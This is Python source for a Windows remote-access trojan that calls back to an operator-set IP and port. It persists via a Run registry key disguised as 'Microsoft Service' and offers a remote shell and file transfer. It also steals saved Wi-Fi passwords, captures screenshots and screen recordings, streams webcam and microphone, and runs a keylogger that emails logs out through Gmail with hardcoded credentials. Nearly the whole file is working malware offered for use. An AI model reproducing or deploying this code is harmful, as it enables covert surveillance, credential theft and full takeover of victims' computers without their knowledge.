import socket
import time
import os
import platform
import win32api
import subprocess
#from unittest.runner import TextTestResult
import pyttsx3
import sys, errno
import unittest
from test import support
import threading
from platform import machine
import pyautogui
import cv2
import pickle
import struct
import ctypes
import numpy 
import pyaudio
from email.mime.multipart import MIMEMultipart,MIMEBase
from email import encoders
from email.mime.text import MIMEText
import smtplib
from pynput.keyboard import Key, Listener
import ssl
import scipy.io.wavfile
import playsound
from pydub import AudioSegment
from pydub.playback import play
from winreg import *

#Target Payload

#always_run functions is about runnig script forever even when the computer restart

def always_run():
 strline = " \ "
 rep = strline.replace(" ","")
 name = "Neopy.exe"
 line = os.getcwd()
 rep = strline.replace(" ","")
 way = line+rep+name
 value=r'Software\Microsoft\Windows\CurrentVersion\Run'
 try:
       key = OpenKey(HKEY_CURRENT_USER,value,0,KEY_ALL_ACCESS)    
 except: 
       key = CreateKeyEx(HKEY_CURRENT_USER,value)

 SetValueEx(key,"Microsoft Service",0,REG_SZ,way)
 CloseKey(key)

#If you want the script to be saved in the regedit of the target system, uncomment the following code

#always_run()

#Restart function is to restart the target system
def Restart():  
          time = con.recv(1024)
          int_time = time.decode("utf-8")
          os.system("shutdown /r /t "+str(int_time))

#shutdown function is to shutdown the target system
def Shutdown():
          time = con.recv(1024)
          int_time = time.decode("utf-8")
          os.system("shutdown /s /t "+str(int_time))  

#Logoff function is to Logoff the target system
def  Logoff():
        time = con.recv(1024)
        nt_time = time.decode("utf-8")
        os.system("shutdown /l /t "+str(nt_time))

#Play_Voice function is to playing voice on target system
def Play_Voice():
    while True :
          text0 = con.recv(2020)
          text = str(text0.decode("utf-8"))
          if text=='0':
              break
          saying = pyttsx3.init()
          saying.setProperty("rate",150)
          saying.say(text)     
          saying.runAndWait() 
 
#Wifi_Info function is to send wifi Information to client system
def Wifi_Info():
    while True :
         wifi_Info = subprocess.check_output("netsh wlan show profiles",shell=True)
         wifi_Info1 = str(wifi_Info.decode("utf-8"))
         Info= bytes(wifi_Info1,'utf-8')
         con.send(Info)
         name0 = con.recv(1024)
         name= str(name0.decode("utf-8"))
         main_Info = subprocess.check_output('netsh wlan show profiles "'+name+'" key=clear',shell=True)
         main_Info0 = str(main_Info.decode('utf-8'))
         code_Info = bytes(main_Info0,"utf-8")
         con.send(code_Info)

#Drive function is to send Drive Information to client system
def Drive():
      print("drives")
      drives = win32api.GetLogicalDriveStrings()
      drives = drives.split('\000')[:-1]
      bcon=bytes(drives,"utf-8")
      print("drives sending")
      con.send(bcon)
      print("drives sended")
#osing function is to command line
def osing():
        #Drive()
        while True :
          print("os")
          pathing = os.getcwd()+'>'
          path2=bytes(pathing,'utf-8')
         # print('path sending')
          con.sendall(path2)
         # print('path sended')
          data=con.recv(2048)
          data2=str(data.decode("utf-8"))
          if data2=='ex()' :
              break
          elif data2=='cls':
              continue
          elif data2=='dir':
              dir_path = str(os.listdir())
              value2=bytes(dir_path,'utf-8')
              con.send(value2)
              continue
          elif data2=='-' :
              continue
          elif data2=='download()':
              Download()
              continue
          elif data2=='upload()':
              Uploade()
              continue
          elif data2=='cd..':
              os.chdir("..")
              continue
          elif data2=='cd':
                 #print("5")
                 pith = os.getcwd()
                 value2=bytes(pith,'utf-8')
                 con.send(value2)  
                 continue
          elif  data2[0:2]=='cd':
             try :
                 os.chdir(data2[3:])
                 continue
             except:
                 #Devil Line 666
                 con.send(b'Not Directory')
                 continue
          try:
              shell = subprocess.check_output(data2,shell=True)
              value=str(shell.decode("utf-8"))
              if  value ==None or value=='':
                  con.send(b'Done')
                  continue
              value2=bytes(value,'utf-8')
              con.send(value2) 
          except:
              con.send(b'command is wrong')
#More_Info function is to send complete information to client system
def More_Info():
    file = str(platform.uname()) + str(platform.architecture())
    #strfile = str(file)
    bfile = bytes(file,"utf-8")   
    con.send(bfile)

def screenshot():
    while True:
        image = pyautogui.screenshot()
        image.save('tpimage.png')
        data = open('tpimage.png', 'rb')
        file = data.read(2048)
        while file:
            con.send(file)
            file = data.read(2048)
        con.send(b'0hibye1')
        data.close()
        print("sended")
        bagain = con.recv(24)
        again = str(bagain.decode("utf-8"))
        if again=='1':
            continue
        elif again=='0':
            break
        else :
            break

def Capture_Camera():
    while True:
        camera= cv2.VideoCapture(0, cv2.CAP_DSHOW)
        return_value, image = camera.read()
        cv2.imwrite('camerapic'+'.png', image)
        del(camera)
        data = open('camerapic.png', 'rb')
        file = data.read(2048)
        while file:
            con.send(file)
            file = data.read(2048)
        con.send(b'0hibye1')
        data.close()
        print("sended")
        bagain = con.recv(24)
        again = str(bagain.decode("utf-8"))
        if again=='1':
            continue
        elif again=='0':
            break
        else:
            break
            
def Record_Camera():
    try:
        vid = cv2.VideoCapture(0)
        while(vid.isOpened()):
            img, frame = vid.read()
            a = pickle.dumps(frame)
            msg = struct.pack("Q",len(a))+a
            con.sendall(msg)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
            co = con.recv(12)
            if str(co.decode("utf-8"))=='0':
                break
    except:
        print("000error000")
        pass

def Change_Background():
    file = open('pic.png','wb')
    data = con.recv(2048)
    print("start")
    while data :
        file.write(data)
        data = con.recv(2048) 
        if '0hibye1' in str(data.decode(errors='ignore')):
            str(data).replace('0hibye1','')
            file.write(data)
            break
        else:
            pass  
    file.close()
    print("1end1")
    way = str(os.getcwd())
    SPI_SETDESKWALLPAPER = 20
    WALLPAPER_PATH = way + r'\pic.png'


    def is_64_windows():
        """Find out how many bits is OS. """
        return struct.calcsize('P') * 8 == 64


    def get_sys_parameters_info():
        """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
        return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
            else ctypes.windll.user32.SystemParametersInfoA


    def change_wallpaper():
        sys_parameters_info = get_sys_parameters_info()
        r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)

        # When the SPI_SETDESKWALLPAPER flag is used,
        # SystemParametersInfo returns TRUE
        # unless there is an error (like when the specified file doesn't exist).
        if not r:
            print(ctypes.WinError())


    change_wallpaper()
    print("changed")

def Screen_Recorder():
    print("start")
    resolution = (1920, 1080)
    #print("0")
    codec = cv2.VideoWriter_fourcc(*"XVID")
   # print("002")
    filename = "Screen_Recording.avi"
    fps = 60.0
   # print("003")
    out = cv2.VideoWriter(filename, codec, fps, resolution)
   # print("004")
    #cv2.namedWindow("Live", cv2.WINDOW_NORMAL)
    #cv2.resizeWindow("Live", 480, 270)
    try :
        while True:
           # print("start while")
            img = pyautogui.screenshot()
            frame = numpy.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            #sframe = frame.read()
            a = pickle.dumps(frame)
            msg = struct.pack("Q",len(a))+a
            con.sendall(msg)
            #cv2.imshow('Live', frame)
            if cv2.waitKey(1) == ord('q'):
                break
            co = con.recv(12)
            if str(co.decode("utf-8"))=='0':
                break
    except:
        print("000error000")
        pass

    #out.release()
    #cv2.destroyAllWindows()

def Screen_Recorder_TP():
  data = b""
  payload_size = struct.calcsize("Q")
  while True :
      while len(data) < payload_size :
          packet = con.recv(4*1024)
          if not packet : break
          data +=packet
      packed_msg_size= data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack("Q",packed_msg_size)[0]
      while len(data) < msg_size :
          data += con.recv(4*1024)
      framedata = data[:msg_size]
      data = data[msg_size:]
      frame = pickle.loads(framedata)
      cv2.imshow("tp",frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break

def Voice_Recorder_online():
   con.send(b'sec')
   insecond = con.recv(124)
   RECORD_SECONDS = int(insecond.decode("utf-8"))
   FORMAT = pyaudio.paInt16
   CHUNK = 1024
   CHANNELS = 1
   RATE = 44100
   frames = []
   audio = pyaudio.PyAudio()
   while  True :
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                rate=RATE, input=True,
                frames_per_buffer=CHUNK)
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(numpy.fromstring(data, dtype=numpy.int16))
        numpydata = numpy.hstack(frames)
        a = pickle.dumps(numpydata)
        frames=[]
        msg = struct.pack("Q",len(a))+a
        con.sendall(msg)
        stream.stop_stream()
        stream.close()
        audio.terminate()

def Voice_Recorder_file():
   fs = 44100
   con.send(b'sec')
   insecond = con.recv(124)
   RECORD_SECONDS = int(insecond.decode("utf-8"))
   FORMAT = pyaudio.paInt16
   CHUNK = 1024
   CHANNELS = 1
   RATE = 44100
   frames = []
   audio = pyaudio.PyAudio()
   stream = audio.open(format=FORMAT, channels=CHANNELS,
   rate=RATE, input=True,
   frames_per_buffer=CHUNK)
   for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(numpy.fromstring(data, dtype=numpy.int16))
   numpydata = numpy.hstack(frames)
   a = pickle.dumps(numpydata)
   frames=[]
   msg = struct.pack("Q",len(a))+a
   con.sendall(msg)
   stream.stop_stream()
   stream.close()
   audio.terminate()

   data.close()
count = 0
keys = []
def Active_KeyLogger():
   msg = MIMEMultipart()
   msg['From'] = "neomainready@gmail.com"
   msg['Subject'] = "test"
   #count = 0
   #keys = []
   def keylog():
        def on_press(key):
            global keys,count
            keys.append(key)
            count += 1
            #print("{0} preesed".format(key))
            if count >= 10 :
                count = 0
                write_file(keys)
                keys = []
        def write_file(keys):
            with open("log.txt","a") as f:
                for key in keys:
                    k = str(key).replace("'","")
                    if k.find("space") > 0:
                        f.write('\n')
                    elif k.find("Key") == -1 :
                        f.write(k)
        def on_release(key):
            if key == Key.esc:
                return False
        with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()

   def timezone():
        usermail = con.recv(1024)
        con.send(b'1')
        strusermail = str(usermail.decode('utf-8'))
        sec = con.recv(1024)
        strsec = str(sec.decode('utf-8'))
        intsec = int(strsec)
        password = "209ufuch297y17eyd"
        msg['From'] = "neomainready@gmail.com"
        msg['To'] = strusermail
        msg['Subject'] = "test"
        filename = "log.txt"
        while True :
            time.sleep(intsec)
            #txt = open("log.txt","r")
            #logs = txt.read()
            body = "Your Target Keyboard Logs "
            msg.attach(MIMEText(body, "plain"))
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read()) 
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {filename}",
            )
            msg.attach(part)
            print("1")
            text = msg.as_string()
            print("2")
            context = ssl.create_default_context()
            print("3")
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(msg['From'], password)
                print("4")
                server.sendmail( msg['From'], msg['To'], text )
   threading.Thread(target=keylog).start()
   threading.Thread(target=timezone).start()

def Download():
    while True :
        filepath = con.recv(2042)
        sfilepath=str(filepath.decode("utf-8"))
        if sfilepath=='ex()':
            break
        try :
            data = open(sfilepath,'rb')
            file = data.read(2048)
        except :
            con.send(b'-')
            continue
        while file:
            con.send(file)
            file = data.read(2048)
        con.send(b'0hibye1')
        data.close()
        print("sended")
        bagain = con.recv(24)
        again = str(bagain.decode("utf-8"))
        if again=='1':
            continue
        elif again=='0':
            break
        else:
            break
        
def Uploade():
    while True:
        #print("1")
        filefamily = con.recv(2042)
        sfilefamily=str(filefamily.decode("utf-8"))
        if sfilefamily=='ex()':
            break
        #con.send(b'1')
        filetype = con.recv(2042)
        #con.send(b'1')
        sfiletype=str(filetype.decode(errors='ignore'))
        if sfiletype=='ex()':
            break
        try:
            file = open(sfilefamily+sfiletype,'wb')
        except:
            pass
       # print("done")
        data = con.recv(2048)
        while data :
            file.write(data)
            data = con.recv(2048)
            if '0hibye1' in str(data.decode(errors='ignore')):
                str(data).replace('0hibye1','')
                file.write(data)
                break
            else:
                pass
        print("1")
        file.close()
        con.send(b'1')
        bagain = con.recv(24)
        again = str(bagain.decode("utf-8"))
        if again=='1':
            continue
        elif again=='0':
            break
        else:
            break

def Voice_Recorder_online_TP():
    RATE = 44100
    data = b""
    payload_size = struct.calcsize("Q")
    while True :
        while len(data) < payload_size :
                packet = con.recv(4*1024)
                if not packet : break
                data +=packet
        packed_msg_size= data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q",packed_msg_size)[0]
        while len(data) < msg_size :
                data += con.recv(4*1024)
        framedata = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(framedata)
        scipy.io.wavfile.write("recvoic.wav",RATE,frame)
        playsound.playsound('recvoic.wav')
        print("1")

def Voice_Recorder_file_TP():
  file = open('rec.wav','wb')
  data = con.recv(2048)
  while data :
    file.write(data)
    data = con.recv(2048)  
  file.close()
  song = AudioSegment.from_wav("rec.wav")
  play(song)
  os.remove("rec.wav")

def Record_Camera_TP():
  data = b""
  payload_size = struct.calcsize("Q")
  while True :
      while len(data) < payload_size :
          packet = con.recv(4*1024)
          if not packet : break
          data +=packet
      packed_msg_size= data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack("Q",packed_msg_size)[0]
      while len(data) < msg_size :
          data += con.recv(4*1024)
      framedata = data[:msg_size]
      data = data[msg_size:]
      frame = pickle.loads(framedata)
      cv2.imshow("neo",frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break

def wmic():
    try:
        shell = subprocess.check_output("wmic product get name",shell=True)
        value=str(shell.decode(errors='ignore'))
        value2=bytes(value,'utf-8')
        con.send(value2) 
    except:
        con.send(b'somthing is wrong...')

def tasklist():
    try :
        shell = subprocess.check_output("tasklist",shell=True)
        value=str(shell.decode("utf-8"))
        value2=bytes(value,'utf-8')
        con.send(value2) 
    except :
        con.send(b'somthing is wrong...')

def massage():
    text = con.recv(444444)
    strtext = str(text.decode("utf-8"))
    warning = "MsgBox "+'"'+strtext+'"'
    f = open("warn.vbs","w")
    f.writelines(warning)
    f.close
    subprocess.Popen("warn.vbs",shell=True,stderr=subprocess.STDOUT)
    #os.system("warn.vbs")

#---------------------------------------------start--------------------------------
while True:
    print("Welcom To The Neo")
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Pls Wait . .  ")
    while True :             
        IP ="127.0.0.1" #Enter your IP
        PORT = 2334	  
        try :
                con.connect((IP,PORT))
                break
        except :            	                 
                continue
            
    
    print("connected successfully")
    device = platform.platform()
    info = str(device)
    info2= bytes(info, 'utf_8')
    con.sendall(info2)
    try :
        while True:
            print("Active")
            op1 = con.recv(1024)
            op = str(op1.decode("utf-8"))
            if op == 'Restart':
                Restart()
            elif op == "shutdown":
                Shutdown()
            elif op == 'Voice':
                Play_Voice()
            elif op == 'Wifi':
                Wifi_Info()
            elif op == 'Drive':
                Drive()
            elif op == 'logoff':
                Logoff()
            elif op == 'Info':
                More_Info()
            elif op == 'ScreenShot':
                screenshot()
            elif op=='Capture_Camera':
                Capture_Camera()
            elif op=='Record_Camera':
                Record_Camera()
            elif op=='Record_Camera_TP':
                Record_Camera_TP()
            elif op=='Change_Background':
                Change_Background()
            elif op=='Screen_Recorder':
                Screen_Recorder()
            elif op=='Screen_Recorder_TP':
                Screen_Recorder_TP()
            elif op=='Voice_Recorder_online':
                Voice_Recorder_online()
            elif op=='Voice_Recorder_online_TP':
                Voice_Recorder_online_TP()
            elif op=='Voice_Recorder_file':
                Voice_Recorder_file()
            elif op=='Voice_Recorder_file_TP':
                Voice_Recorder_file_TP()
            elif op=='Active_KeyLogger':
                Active_KeyLogger()
            elif op=='OS':
                osing()
            elif op=='Download':
                Download()
            elif op=='Uploade':
                Uploade()
            elif op=='wmic':
                wmic()
            elif op=='tasklist':
                tasklist()
            elif op=='massage':
                massage()
            elif op=='0':
                continue
            elif op=='exit':
                break
            else:
                break
        print("exited")
    except:
        continue

